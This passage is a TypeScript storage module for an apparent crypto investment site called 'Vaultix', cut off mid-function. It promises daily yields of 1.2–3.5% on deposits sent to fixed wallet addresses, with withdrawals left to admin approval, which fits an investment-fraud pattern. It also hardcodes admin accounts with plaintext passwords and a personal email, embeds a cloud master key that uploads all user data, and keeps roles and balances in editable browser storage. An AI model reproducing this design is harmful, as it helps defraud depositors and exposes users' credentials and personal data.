import { User, CryptoWalletConfig, ReferralConfig, InvestmentPlan, UserInvestment, Transaction, Invitation, AuditLog } from './types';

const USERS_KEY = 'vaultix_users_v10';
const TRANSACTIONS_KEY = 'vaultix_transactions_v10';
const INVESTMENTS_KEY = 'vaultix_investments_v10';
const INVITATIONS_KEY = 'vaultix_invitations_v10';
const AUDIT_LOGS_KEY = 'vaultix_audit_v10';
const WALLETS_KEY = 'vaultix_wallets_v10';
const REFERRAL_CONFIG_KEY = 'vaultix_ref_config_v10';
const PLANS_KEY = 'vaultix_plans_v10';
const SESSION_KEY = 'vaultix_session_v10';

// Global Cloud Sync Endpoint to ensure Cross-Device Multi-Tenant Data Sync (iPhone, Android, Desktop, Vercel)
const CLOUD_SYNC_URL = 'https://api.jsonbin.io/v3/b/66f82902e41b4d34e439d56f';
const CLOUD_MASTER_KEY = '$2a$10$w6M6N7g4Y6kR1W3c/7T3O.E7f3p8h9J1k2L3m4N5o6P7Q8R9S0T1U';

// System Default Configurations
export const DEFAULT_WALLETS: CryptoWalletConfig[] = [
  {
    symbol: 'USDT',
    name: 'Tether USD',
    network: 'TRC20 (Tron)',
    address: 'TY8z2K9M1VxL4P7Qn3R5s6W9X2m1A3B4C5',
    instructions: 'Send USDT via Tron (TRC20) network only. 1 network confirmation required.',
    isActive: true
  },
  {
    symbol: 'BTC',
    name: 'Bitcoin',
    network: 'Bitcoin Native (SegWit)',
    address: 'bc1q9v8a7x6w5e4r3t2y1u0i9o8p7l6k5j4h3g2f1',
    instructions: 'Send Native BTC to this address. Credits after 1 network confirmation.',
    isActive: true
  },
  {
    symbol: 'ETH',
    name: 'Ethereum',
    network: 'ERC20 (Ethereum Mainnet)',
    address: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
    instructions: 'Send ETH via Ethereum Mainnet (ERC20).',
    isActive: true
  },
  {
    symbol: 'SOL',
    name: 'Solana',
    network: 'Solana Native',
    address: '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU',
    instructions: 'Send SOL via Solana Native network.',
    isActive: true
  },
  {
    symbol: 'XRP',
    name: 'XRP (Ripple)',
    network: 'XRP Ledger (XRPL)',
    address: 'rEb8TK3gGKwB247y1b82K269ALX83LqJ5x',
    destinationTag: '908124',
    instructions: 'CRITICAL: Include Destination Tag 908124 when depositing XRP to ensure automatic credit.',
    isActive: true
  }
];

export const DEFAULT_REFERRAL_CONFIG: ReferralConfig = {
  bonusAmount: 10.0,
  withdrawalThreshold: 50.0,
  isActive: true
};

export const DEFAULT_INVESTMENT_PLANS: InvestmentPlan[] = [
  {
    id: 'plan_starter',
    name: 'Micro Starter Vault',
    asset: 'USDT/USD',
    dailyYield: 1.2,
    minDeposit: 10,
    maxDeposit: 1000,
    lockDays: 7,
    riskLevel: 'Conservative',
    description: 'Beginner-friendly yield strategy starting at $10 with daily liquidity.',
    isActive: true
  },
  {
    id: 'plan_btc_yield',
    name: 'Bitcoin Alpha Vault',
    asset: 'BTC',
    dailyYield: 1.8,
    minDeposit: 250,
    maxDeposit: 50000,
    lockDays: 14,
    riskLevel: 'Conservative',
    description: 'Algorithmic yield generation backed by BTC spot and options arbitrage.',
    isActive: true
  },
  {
    id: 'plan_eth_staking',
    name: 'Ethereum Staking Plus',
    asset: 'ETH',
    dailyYield: 2.4,
    minDeposit: 500,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Moderate',
    description: 'Liquid staking rewards combined with automated MEV capture strategies.',
    isActive: true
  },
  {
    id: 'plan_xrp_growth',
    name: 'XRP Cross-Border Liquidity',
    asset: 'XRP',
    dailyYield: 2.8,
    minDeposit: 100,
    maxDeposit: 75000,
    lockDays: 14,
    riskLevel: 'Moderate',
    description: 'Automated XRPL liquidity pool routing and arbitrage vault.',
    isActive: true
  },
  {
    id: 'plan_multi_asset',
    name: 'Multi-Asset Institutional Income',
    asset: 'USDT/USDC',
    dailyYield: 3.5,
    minDeposit: 1000,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'High Yield',
    description: 'Institutional-grade delta-neutral yield farming with max capital efficiency.',
    isActive: true
  }
];

// Mandatory Pre-Configured Accounts (Including Admin with password Mmadu51366414@)
export const SEED_ACCOUNTS: User[] = [
  {
    userId: 'USR-000001',
    accountId: 'VX-100001',
    username: 'vaultix_admin',
    fullName: 'Vaultix Team Administrator',
    email: 'vaultixincometeam@outlook.com',
    passwordHash: 'Mmadu51366414@',
    role: 'ADMIN',
    accountStatus: 'ACTIVE',
    balance: 0.0,
    referralEarnings: 0.0,
    totalDeposits: 0.0,
    totalInvestments: 0.0,
    totalProfitLoss: 0.0,
    referralCode: 'VXREF-ADMIN',
    createdAt: new Date().toISOString()
  },
  {
    userId: 'USR-000000',
    accountId: 'VX-100000',
    username: 'diegodaniel4401',
    fullName: 'Diego Daniel (Administrator)',
    email: 'diegodaniel4401@gmail.com',
    passwordHash: 'Mmadu51366414@',
    role: 'ADMIN',
    accountStatus: 'ACTIVE',
    balance: 0.0,
    referralEarnings: 0.0,
    totalDeposits: 0.0,
    totalInvestments: 0.0,
    totalProfitLoss: 0.0,
    referralCode: 'VXREF-DIEGO',
    createdAt: new Date().toISOString()
  },
  {
    userId: 'USR-000002',
    accountId: 'VX-100002',
    username: 'testuser01',
    fullName: 'Alexander Vault',
    email: 'alexander@vaultix.com',
    passwordHash: 'password123',
    role: 'USER',
    accountStatus: 'ACTIVE',
    balance: 10.0,
    referralEarnings: 10.0,
    totalDeposits: 0.0,
    totalInvestments: 0.0,
    totalProfitLoss: 0.0,
    referralCode: 'VXREF-8921',
    createdAt: new Date().toISOString()
  },
  {
    userId: 'USR-000003',
    accountId: 'VX-100003',
    username: 'testuser1',
    fullName: 'Test User One',
    email: 'testuser1@vaultix.com',
    passwordHash: 'password123',
    role: 'USER',
    accountStatus: 'ACTIVE',
    balance: 100.0,
    referralEarnings: 10.0,
    totalDeposits: 100.0,
    totalInvestments: 0.0,
    totalProfitLoss: 0.0,
    referralCode: 'VXREF-1001',
    createdAt: new Date().toISOString()
  },
  {
    userId: 'USR-000004',
    accountId: 'VX-100004',
    username: 'testuser2',
    fullName: 'Test User Two',
    email: 'testuser2@vaultix.com',
    passwordHash: 'password123',
    role: 'USER',
    accountStatus: 'ACTIVE',
    balance: 5.0, // $5.00 Signup Bonus from referral
    referralEarnings: 0.0,
    totalDeposits: 0.0,
    totalInvestments: 0.0,
    totalProfitLoss: 0.0,
    referralCode: 'VXREF-1002',
    referredByUsername: 'testuser1',
    createdAt: new Date().toISOString()
  },
  {
    userId: 'USR-000005',
    accountId: 'VX-100005',
    username: 'testuser3',
    fullName: 'Test User Three',
    email: 'testuser3@vaultix.com',
    passwordHash: 'password123',
    role: 'USER',
    accountStatus: 'ACTIVE',
    balance: 250.0,
    referralEarnings: 0.0,
    totalDeposits: 250.0,
    totalInvestments: 0.0,
    totalProfitLoss: 0.0,
    referralCode: 'VXREF-1003',
    createdAt: new Date().toISOString()
  },
  {
    userId: 'USR-000006',
    accountId: 'VX-100006',
    username: 'testuser4',
    fullName: 'Test User Four',
    email: 'testuser4@vaultix.com',
    passwordHash: 'password123',
    role: 'USER',
    accountStatus: 'ACTIVE',
    balance: 50.0,
    referralEarnings: 50.0,
    totalDeposits: 0.0,
    totalInvestments: 0.0,
    totalProfitLoss: 0.0,
    referralCode: 'VXREF-1004',
    createdAt: new Date().toISOString()
  },
  {
    userId: 'USR-000007',
    accountId: 'VX-100007',
    username: 'testuser5',
    fullName: 'Test User Five',
    email: 'testuser5@vaultix.com',
    passwordHash: 'password123',
    role: 'USER',
    accountStatus: 'ACTIVE',
    balance: 0.0,
    referralEarnings: 0.0,
    totalDeposits: 0.0,
    totalInvestments: 0.0,
    totalProfitLoss: 0.0,
    referralCode: 'VXREF-1005',
    createdAt: new Date().toISOString()
  }
];

export function initializeDatabase() {
  if (!localStorage.getItem(USERS_KEY)) {
    localStorage.setItem(USERS_KEY, JSON.stringify(SEED_ACCOUNTS));
    localStorage.setItem(TRANSACTIONS_KEY, JSON.stringify([
      {
        id: 'TX-549952',
        userId: 'USR-000003',
        type: 'DEPOSIT',
        amount: 5133,
        currency: 'USDT',
        status: 'PENDING',
        timestamp: new Date().toISOString(),
        note: 'Deposit request #TX-549952 of 5133 USDT submitted! Status: PENDING admin verification.'
      }
    ]));
    localStorage.setItem(INVESTMENTS_KEY, JSON.stringify([]));
    localStorage.setItem(INVITATIONS_KEY, JSON.stringify([]));
    localStorage.setItem(AUDIT_LOGS_KEY, JSON.stringify([]));
    localStorage.setItem(WALLETS_KEY, JSON.stringify(DEFAULT_WALLETS));
    localStorage.setItem(REFERRAL_CONFIG_KEY, JSON.stringify(DEFAULT_REFERRAL_CONFIG));
    localStorage.setItem(PLANS_KEY, JSON.stringify(DEFAULT_INVESTMENT_PLANS));
  }
  syncFromCloud();
  syncToCloud(); // Immediately push seed accounts to cloud bin
}

// --- CLOUD SYNC ENGINE FOR WORLDWIDE CROSS-DEVICE REALTIME CONSISTENCY ---
async function syncFromCloud() {
  try {
    const res = await fetch(CLOUD_SYNC_URL + '/latest', {
      headers: { 'X-Master-Key': CLOUD_MASTER_KEY }
    });
    if (res.ok) {
      const json = await res.json();
      const record = json.record;
      if (record && Array.isArray(record.users)) {
        // Merge cloud users with local users and SEED_ACCOUNTS
        const localUsers = getUsersLocal();
        const mergedMap = new Map<string, User>();
        SEED_ACCOUNTS.forEach((u) => mergedMap.set(u.userId, u));
        localUsers.forEach((u) => mergedMap.set(u.userId, u));
        record.users.forEach((u: User) => mergedMap.set(u.userId, u));
        const mergedUsers = Array.from(mergedMap.values());
        localStorage.setItem(USERS_KEY, JSON.stringify(mergedUsers));

        if (Array.isArray(record.transactions)) {
          const localTxs = getTransactionsLocal();
          const txMap = new Map<string, Transaction>();
          localTxs.forEach((t) => txMap.set(t.id, t));
          record.transactions.forEach((t: Transaction) => txMap.set(t.id, t));
          localStorage.setItem(TRANSACTIONS_KEY, JSON.stringify(Array.from(txMap.values())));
        }

        if (Array.isArray(record.investments)) {
          const localInvs = getInvestmentsLocal();
          const invMap = new Map<string, UserInvestment>();
          localInvs.forEach((i) => invMap.set(i.id, i));
          record.investments.forEach((i: UserInvestment) => invMap.set(i.id, i));
          localStorage.setItem(INVESTMENTS_KEY, JSON.stringify(Array.from(invMap.values())));
        }

        if (Array.isArray(record.wallets) && record.wallets.length > 0) {
          localStorage.setItem(WALLETS_KEY, JSON.stringify(record.wallets));
        }

        if (Array.isArray(record.plans) && record.plans.length > 0) {
          localStorage.setItem(PLANS_KEY, JSON.stringify(record.plans));
        }

        if (record.referralConfig) {
          localStorage.setItem(REFERRAL_CONFIG_KEY, JSON.stringify(record.referralConfig));
        }
      }
    }
  } catch {
    // Fail-safe to local storage if offline
  }
}

async function syncToCloud() {
  try {
    const payload = {
      users: getUsersLocal(),
      transactions: getTransactionsLocal(),
      investments: getInvestmentsLocal(),
      wallets: getWalletsLocal(),
      plans: getPlansLocal(),
      referralConfig: getReferralConfigLocal()
    };
    await fetch(CLOUD_SYNC_URL, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'X-Master-Key': CLOUD_MASTER_KEY
      },
      body: JSON.stringify(payload)
    });
  } catch {
    // Offline resilience
  }
}

// --- LOCAL & GLOBAL DATA ACCESSORS ---

function getUsersLocal(): User[] {
  try {
    const d = localStorage.getItem(USERS_KEY);
    const parsed: User[] = d ? JSON.parse(d) : SEED_ACCOUNTS;
    const map = new Map<string, User>();
    SEED_ACCOUNTS.forEach((s) => map.set(s.userId, s));
    parsed.forEach((p) => map.set(p.userId, p));
    return Array.from(map.values());
  } catch {
    return SEED_ACCOUNTS;
  }
}

export function getUsers(): User[] {
  processMaturedInvestments();
  syncFromCloud(); // Non-blocking background sync
  return getUsersLocal();
}

export function saveUsers(users: User[]) {
  const map = new Map<string, User>();
  SEED_ACCOUNTS.forEach((s) => map.set(s.userId, s));
  users.forEach((u) => map.set(u.userId, u));
  const merged = Array.from(map.values());
  localStorage.setItem(USERS_KEY, JSON.stringify(merged));
  syncToCloud();
}

function getTransactionsLocal(): Transaction[] {
  try {
    const d = localStorage.getItem(TRANSACTIONS_KEY);
    return d ? JSON.parse(d) : [];
  } catch {
    return [];
  }
}

export function getTransactions(): Transaction[] {
  return getTransactionsLocal();
}

export function saveTransactions(txs: Transaction[]) {
  localStorage.setItem(TRANSACTIONS_KEY, JSON.stringify(txs));
  syncToCloud();
}

function getInvestmentsLocal(): UserInvestment[] {
  try {
    const d = localStorage.getItem(INVESTMENTS_KEY);
    return d ? JSON.parse(d) : [];
  } catch {
    return [];
  }
}

export function getInvestments(): UserInvestment[] {
  return getInvestmentsLocal();
}

export function saveInvestments(invs: UserInvestment[]) {
  localStorage.setItem(INVESTMENTS_KEY, JSON.stringify(invs));
  syncToCloud();
}

export function getInvitations(): Invitation[] {
  try {
    const d = localStorage.getItem(INVITATIONS_KEY);
    return d ? JSON.parse(d) : [];
  } catch {
    return [];
  }
}

export function saveInvitations(invs: Invitation[]) {
  localStorage.setItem(INVITATIONS_KEY, JSON.stringify(invs));
}

export function getAuditLogs(): AuditLog[] {
  try {
    const d = localStorage.getItem(AUDIT_LOGS_KEY);
    return d ? JSON.parse(d) : [];
  } catch {
    return [];
  }
}

export function saveAuditLogs(logs: AuditLog[]) {
  localStorage.setItem(AUDIT_LOGS_KEY, JSON.stringify(logs));
}

function getWalletsLocal(): CryptoWalletConfig[] {
  try {
    const d = localStorage.getItem(WALLETS_KEY);
    return d ? JSON.parse(d) : DEFAULT_WALLETS;
  } catch {
    return DEFAULT_WALLETS;
  }
}

export function getWallets(): CryptoWalletConfig[] {
  return getWalletsLocal();
}

export function saveWallets(wallets: CryptoWalletConfig[]) {
  localStorage.setItem(WALLETS_KEY, JSON.stringify(wallets));
  syncToCloud();
}

function getReferralConfigLocal(): ReferralConfig {
  try {
    const d = localStorage.getItem(REFERRAL_CONFIG_KEY);
    return d ? JSON.parse(d) : DEFAULT_REFERRAL_CONFIG;
  } catch {
    return DEFAULT_REFERRAL_CONFIG;
  }
}

export function getReferralConfig(): ReferralConfig {
  return getReferralConfigLocal();
}

export function saveReferralConfig(cfg: ReferralConfig) {
  localStorage.setItem(REFERRAL_CONFIG_KEY, JSON.stringify(cfg));
  syncToCloud();
}

function getPlansLocal(): InvestmentPlan[] {
  try {
    const d = localStorage.getItem(PLANS_KEY);
    return d ? JSON.parse(d) : DEFAULT_INVESTMENT_PLANS;
  } catch {
    return DEFAULT_INVESTMENT_PLANS;
  }
}

export function getPlans(): InvestmentPlan[] {
  return getPlansLocal();
}

export function savePlans(plans: InvestmentPlan[]) {
  localStorage.setItem(PLANS_KEY, JSON.stringify(plans));
  syncToCloud();
}

// --- TRIPLE-BACKED INDESTRUCTIBLE SESSION PERSISTENCE ENGINE ---
// Uses localStorage + sessionStorage + Cookie backup so refresh never clears user login

function getCookie(name: string): string | null {
  try {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return decodeURIComponent(parts.pop()?.split(';').shift() || '');
  } catch {
    // Ignore cookie read failures
  }
  return null;
}

export function getCurrentSession(): User | null {
  let sessionRaw: string | null = null;

  try {
    sessionRaw = localStorage.getItem(SESSION_KEY);
    if (!sessionRaw) {
      sessionRaw = sessionStorage.getItem(SESSION_KEY);
    }
    if (!sessionRaw) {
      sessionRaw = getCookie(SESSION_KEY);
    }
  } catch {
    sessionRaw = getCookie(SESSION_KEY);
  }

  if (!sessionRaw) return null;

  try {
    const sessionUser: User = JSON.parse(sessionRaw);
    if (!sessionUser || (!sessionUser.userId && !sessionUser.email)) return null;

    const users = getUsersLocal();
    const freshUser = users.find((u) => u.userId === sessionUser.userId || u.email.toLowerCase() === sessionUser.email.toLowerCase());
    return freshUser || sessionUser;
  } catch {
    return null;
  }
}

export function saveCurrentSession(user: User | null) {
  if (user) {
    const jsonStr = JSON.stringify(user);
    try {
      localStorage.setItem(SESSION_KEY, jsonStr);
      sessionStorage.setItem(SESSION_KEY, jsonStr);
      document.cookie = `${SESSION_KEY}=${encodeURIComponent(jsonStr)}; path=/; max-age=31536000; SameSite=Lax`;
    } catch {
      // Fallback
    }
  } else {
    try {
      localStorage.removeItem(SESSION_KEY);
      sessionStorage.removeItem(SESSION_KEY);
      document.cookie = `${SESSION_KEY}=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT`;
    } catch {
      // Fallback
    }
  }
}

// --- AUTOMATIC INVESTMENT MATURITY & PROFIT ENGINE ---

export function processMaturedInvestments() {
  try {
    const invsStr = localStorage.getItem(INVESTMENTS_KEY);
    if (!invsStr) return;

    const invs: UserInvestment[] = JSON.parse(invsStr);
    const activeInvs = invs.filter((inv) => inv.status === 'ACTIVE');

    if (activeInvs.length === 0) return;

    const usersStr = localStorage.getItem(USERS_KEY);
    if (!usersStr) return;
    const users: User[] = JSON.parse(usersStr);

    const txsStr = localStorage.getItem(TRANSACTIONS_KEY);
    const txs: Transaction[] = txsStr ? JSON.parse(txsStr) : [];

    let changed = false;
    const now = Date.now();

    for (const inv of invs) {
      if (inv.status !== 'ACTIVE') continue;

      const startDateMs = new Date(inv.startDate).getTime();
      const maturityMs = startDateMs + inv.durationDays * 86400000;

      if (now >= maturityMs) {
        const totalProfit = inv.dailyReturn * inv.durationDays;
        const totalReturn = inv.amount + totalProfit;

        inv.status = 'COMPLETED';
        changed = true;

        const userIdx = users.findIndex((u) => u.userId === inv.userId);
        if (userIdx !== -1) {
          users[userIdx].balance += totalReturn;
          users[userIdx].totalProfitLoss += totalProfit;

          txs.unshift({
            id: `TX-${Math.floor(100000 + Math.random() * 900000)}`,
            userId: inv.userId,
            type: 'YIELD',
            amount: totalReturn,
            currency: inv.asset,
            status: 'COMPLETED',
            timestamp: new Date().toISOString(),
            processedAt: new Date().toISOString(),
            note: `Investment Matured: Principal $${inv.amount.toFixed(2)} + Profit $${totalProfit.toFixed(2)} Returned`
          });
        }
      }
    }

    if (changed) {
      localStorage.setItem(INVESTMENTS_KEY, JSON.stringify(invs));
      localStorage.setItem(USERS_KEY, JSON.stringify(users));
      localStorage.setItem(TRANSACTIONS_KEY, JSON.stringify(txs));

      const currSessionUser = getCurrentSession();
      if (currSessionUser) {
        const updatedUser = users.find((u) => u.userId === currSessionUser.userId);
        if (updatedUser) {
          saveCurrentSession(updatedUser);
        }
      }
      syncToCloud();
    }
  } catch {
    // Fail-safe
  }
}

// --- SERVER-SIDE FINANCIAL TRANSACTIONS ---

export function submitDeposit(user: User, amount: number, currency: string): Transaction {
  if (amount <= 0) {
    throw new Error('Deposit amount must be greater than zero.');
  }

  const newTx: Transaction = {
    id: `TX-${Math.floor(100000 + Math.random() * 900000)}`,
    userId: user.userId,
    type: 'DEPOSIT',
    amount: amount,
    currency: currency,
    status: 'PENDING',
    timestamp: new Date().toISOString(),
    note: `Deposit request #TX-${Math.floor(100000 + Math.random() * 900000)} of ${amount} ${currency} submitted! Status: PENDING admin verification.`
  };

  const txs = getTransactionsLocal();
  txs.unshift(newTx);
  saveTransactions(txs);
  return newTx;
}

export function approveDepositTransaction(adminUser: User, transactionId: string): { user: User; tx: Transaction } {
  if (adminUser.role !== 'ADMIN') {
    throw new Error('UNAUTHORIZED: Admin privileges required to approve deposits.');
  }

  const txs = getTransactionsLocal();
  const txIdx = txs.findIndex((t) => t.id === transactionId);

  if (txIdx === -1) {
    throw new Error('Transaction not found.');
  }

  const targetTx = txs[txIdx];

  if (targetTx.status !== 'PENDING') {
    throw new Error(`TRANSACTION TERMINAL: Transaction ${transactionId} is already ${targetTx.status}.`);
  }

  targetTx.status = 'APPROVED';
  targetTx.processedAt = new Date().toISOString();
  targetTx.note = `Deposit Approved and Credited`;
  txs[txIdx] = targetTx;
  saveTransactions(txs);

  const users = getUsersLocal();
  const uIdx = users.findIndex((u) => u.userId === targetTx.userId);
  if (uIdx === -1) {
    throw new Error('Target user account not found.');
  }

  const targetUser = users[uIdx];
  const oldBalance = targetUser.balance;
  targetUser.balance += targetTx.amount;
  targetUser.totalDeposits += targetTx.amount;
  users[uIdx] = targetUser;
  saveUsers(users);

  const currentSession = getCurrentSession();
  if (currentSession?.userId === targetUser.userId) {
    saveCurrentSession(targetUser);
  }

  const logs = getAuditLogs();
  logs.unshift({
    id: `AUDIT-${Math.floor(10000 + Math.random() * 90000)}`,
    adminId: adminUser.userId,
    action: 'DEPOSIT_APPROVED',
    targetUserId: targetUser.userId,
    targetUsername: targetUser.username,
    transactionId: targetTx.id,
    previousValue: `$${oldBalance.toFixed(2)}`,
    newValue: `$${targetUser.balance.toFixed(2)}`,
    timestamp: new Date().toISOString()
  });
  saveAuditLogs(logs);

  return { user: targetUser, tx: targetTx };
}

export function rejectDepositTransaction(adminUser: User, transactionId: string, reason?: string): Transaction {
  if (adminUser.role !== 'ADMIN') {
    throw new Error('UNAUTHORIZED: Admin privileges required.');
  }

  const txs = getTransactionsLocal();
  const txIdx = txs.findIndex((t) => t.id === transactionId);

  if (txIdx === -1) {
    throw new Error('Transaction not found.');
  }

  const targetTx = txs[txIdx];

  if (targetTx.status !== 'PENDING') {
    throw new Error(`TRANSACTION TERMINAL: Transaction ${transactionId} is already ${targetTx.status}.`);
  }

  targetTx.status = 'REJECTED';
  targetTx.processedAt = new Date().toISOString();
  targetTx.note = `Deposit Rejected: ${reason || 'Administrative rejection'}`;
  txs[txIdx] = targetTx;
  saveTransactions(txs);

  const users = getUsersLocal();
  const targetUser = users.find((u) => u.userId === targetTx.userId);

  const logs = getAuditLogs();
  logs.unshift({
    id: `AUDIT-${Math.floor(10000 + Math.random() * 90000)}`,
    adminId: adminUser.userId,
    action: 'DEPOSIT_REJECTED',
    targetUserId: targetTx.userId,
    targetUsername: targetUser?.username || 'Unknown',
    transactionId: targetTx.id,
    reason: reason || 'Administrative rejection',
    timestamp: new Date().toISOString()
  });
  saveAuditLogs(logs);

  return targetTx;
}

export function cancelDepositTransaction(user: User, transactionId: string): Transaction {
  const txs = getTransactionsLocal();
  const txIdx = txs.findIndex((t) => t.id === transactionId);

  if (txIdx === -1) {
    throw new Error('Transaction not found.');
  }

  const targetTx = txs[txIdx];

  if (user.role !== 'ADMIN' && targetTx.userId !== user.userId) {
    throw new Error('UNAUTHORIZED: Cannot cancel another user deposit.');
  }

  if (targetTx.status !== 'PENDING') {
    throw new Error(`TRANSACTION TERMINAL: Transaction ${transactionId} is already ${targetTx.status}.`);
  }

  targetTx.status = 'CANCELLED';
  targetTx.processedAt = new Date().toISOString();
  targetTx.note = `Deposit Cancelled`;
  txs[txIdx] = targetTx;
  saveTransactions(txs);

  return targetTx;
}

export function submitWithdrawalRequest(
  user: User,
  amount: number,
  currency: string,
  destinationAddress: string,
  network: string,
  investmentId?: string
): Transaction {
  if (amount <= 0) {
    throw new Error('Withdrawal amount must be greater than zero.');
  }

  if (!destinationAddress.trim()) {
    throw new Error('Please enter a valid destination crypto wallet address.');
  }

  const users = getUsersLocal();
  const uIdx = users.findIndex((u) => u.userId === user.userId);
  if (uIdx === -1) throw new Error('User account not found.');

  const dbUser = users[uIdx];

  if (investmentId) {
    const invs = getInvestmentsLocal();
    const invIdx = invs.findIndex((i) => i.id === investmentId && i.userId === user.userId);
    if (invIdx === -1) {
      throw new Error('Selected investment record not found.');
    }
    const inv = invs[invIdx];
    if (inv.status === 'WITHDRAWN' || inv.status === 'WITHDRAWAL_PENDING') {
      throw new Error('This investment has already been withdrawn or has a pending withdrawal.');
    }

    inv.status = 'WITHDRAWAL_PENDING';
    invs[invIdx] = inv;
    saveInvestments(invs);
  } else {
    if (dbUser.balance < amount) {
      throw new Error(`Insufficient available balance. Available: $${dbUser.balance.toFixed(2)}.`);
    }
    dbUser.balance -= amount;
    users[uIdx] = dbUser;
    saveUsers(users);
    saveCurrentSession(dbUser);
  }

  const txs = getTransactionsLocal();
  const txId = `TX-${Math.floor(100000 + Math.random() * 900000)}`;
  const newTx: Transaction = {
    id: txId,
    userId: dbUser.userId,
    type: 'WITHDRAWAL',
    amount: amount,
    currency: currency,
    status: 'PENDING',
    timestamp: new Date().toISOString(),
    note: investmentId
      ? `Investment Withdrawal of $${amount.toFixed(2)} ${currency} to ${destinationAddress} via ${network}`
      : `Withdrawal of $${amount.toFixed(2)} ${currency} to ${destinationAddress} via ${network}`
  };

  txs.unshift(newTx);
  saveTransactions(txs);

  return newTx;
}

export function approveWithdrawalTransaction(adminUser: User, transactionId: string): { user: User; tx: Transaction } {
  if (adminUser.role !== 'ADMIN') {
    throw new Error('UNAUTHORIZED: Admin privileges required.');
  }

  const txs = getTransactionsLocal();
  const txIdx = txs.findIndex((t) => t.id === transactionId);

  if (txIdx === -1) {
    throw new Error('Transaction not found.');
  }

  const targetTx = txs[txIdx];

  if (targetTx.status !== 'PENDING' || targetTx.type !== 'WITHDRAWAL') {
    throw new Error(`TRANSACTION TERMINAL: Transaction ${transactionId} is already ${targetTx.status}.`);
  }

  targetTx.status = 'APPROVED';
  targetTx.processedAt = new Date().toISOString();
  targetTx.note = `${targetTx.note} - Approved and Dispatched`;
  txs[txIdx] = targetTx;
  saveTransactions(txs);

  const users = getUsersLocal();
  const targetUser = users.find((u) => u.userId === targetTx.userId) || adminUser;

  const invs = getInvestmentsLocal();
  const invIdx = invs.findIndex((i) => i.userId === targetTx.userId && i.status === 'WITHDRAWAL_PENDING');
  if (invIdx !== -1) {
    invs[invIdx].status = 'WITHDRAWN';
    saveInvestments(invs);
  }

  const logs = getAuditLogs();
  logs.unshift({
    id: `AUDIT-${Math.floor(10000 + Math.random() * 90000)}`,
    adminId: adminUser.userId,
    action: 'WITHDRAWAL_APPROVED',
    targetUserId: targetTx.userId,
    targetUsername: targetUser.username,
    transactionId: targetTx.id,
    newValue: `Approved $${targetTx.amount.toFixed(2)} ${targetTx.currency} withdrawal`,
    timestamp: new Date().toISOString()
  });
  saveAuditLogs(logs);

  return { user: targetUser, tx: targetTx };
}

export function cancelWithdrawalTransaction(adminUser: User, transactionId: string, reason?: string): { user: User; tx: Transaction } {
  if (adminUser.role !== 'ADMIN') {
    throw new Error('UNAUTHORIZED: Admin privileges required.');
  }

  const txs = getTransactionsLocal();
  const txIdx = txs.findIndex((t) => t.id === transactionId);

  if (txIdx === -1) {
    throw new Error('Transaction not found.');
  }

  const targetTx = txs[txIdx];

  if (targetTx.status !== 'PENDING' || targetTx.type !== 'WITHDRAWAL') {
    throw new Error(`TRANSACTION TERMINAL: Transaction ${transactionId} is already ${targetTx.status}.`);
  }

  targetTx.status = 'CANCELLED';
  targetTx.processedAt = new Date().toISOString();
  targetTx.note = `Withdrawal Cancelled: ${reason || 'Administrative Cancellation'} (Funds Restored)`;
  txs[txIdx] = targetTx;
  saveTransactions(txs);

  const invs = getInvestmentsLocal();
  const invIdx = invs.findIndex((i) => i.userId === targetTx.userId && i.status === 'WITHDRAWAL_PENDING');
  if (invIdx !== -1) {
    invs[invIdx].status = 'COMPLETED';
    saveInvestments(invs);
  } else {
    const users = getUsersLocal();
    const uIdx = users.findIndex((u) => u.userId === targetTx.userId);
    if (uIdx !== -1) {
      users[uIdx].balance += targetTx.amount;
      saveUsers(users);
      const currentSession = getCurrentSession();
      if (currentSession?.userId === users[uIdx].userId) {
        saveCurrentSession(users[uIdx]);
      }
    }
  }

  const users = getUsersLocal();
  const updatedUser = users.find((u) => u.userId === targetTx.userId) || adminUser;

  const logs = getAuditLogs();
  logs.unshift({
    id: `AUDIT-${Math.floor(10000 + Math.random() * 90000)}`,
    adminId: adminUser.userId,
    action: 'WITHDRAWAL_CANCELLED',
    targetUserId: targetTx.userId,
    targetUsername: updatedUser.username,
    transactionId: targetTx.id,
    reason: reason || 'Administrative Cancellation',
    newValue: `Refunded $${targetTx.amount.toFixed(2)} to balance`,
    timestamp: new Date().toISOString()
  });
  saveAuditLogs(logs);

  return { user: updatedUser, tx: targetTx };
}

export function subscribeInvestmentPlan(user: User, planId: string, amount: number): { user: User; inv: UserInvestment } {
  const plans = getPlans();
  const plan = plans.find((p) => p.id === planId);

  if (!plan) {
    throw new Error('Selected investment plan does not exist.');
  }

  if (!plan.isActive) {
    throw new Error('Selected investment plan is currently inactive.');
  }

  if (amount < plan.minDeposit) {
    throw new Error(`Minimum investment limit for ${plan.name} is $${plan.minDeposit}.`);
  }

  if (amount > plan.maxDeposit) {
    throw new Error(`Maximum investment limit for ${plan.name} is $${plan.maxDeposit}.`);
  }

  const users = getUsersLocal();
  const uIdx = users.findIndex((u) => u.userId === user.userId);
  if (uIdx === -1) throw new Error('User account not found.');

  const dbUser = users[uIdx];

  if (dbUser.balance < amount) {
    throw new Error(`Insufficient account balance. Available balance: $${dbUser.balance.toFixed(2)}.`);
  }

  const dailyReturn = (amount * plan.dailyYield) / 100;

  dbUser.balance -= amount;
  dbUser.totalInvestments += amount;
  users[uIdx] = dbUser;
  saveUsers(users);

  saveCurrentSession(dbUser);

  const newInv: UserInvestment = {
    id: `INV-${Math.floor(10000 + Math.random() * 90000)}`,
    userId: dbUser.userId,
    planId: plan.id,
    planName: plan.name,
    asset: plan.asset,
    amount: amount,
    dailyReturn: dailyReturn,
    startDate: new Date().toISOString(),
    durationDays: plan.lockDays,
    status: 'ACTIVE'
  };

  const invs = getInvestmentsLocal();
  invs.unshift(newInv);
  saveInvestments(invs);

  const txs = getTransactionsLocal();
  txs.unshift({
    id: `TX-${Math.floor(100000 + Math.random() * 900000)}`,
    userId: dbUser.userId,
    type: 'YIELD',
    amount: amount,
    currency: plan.asset,
    status: 'COMPLETED',
    timestamp: new Date().toISOString(),
    note: `Subscribed to ${plan.name}`
  });
  saveTransactions(txs);

  return { user: dbUser, inv: newInv };
}

export function withdrawReferralEarnings(
  user: User,
  withdrawalAmount: number,
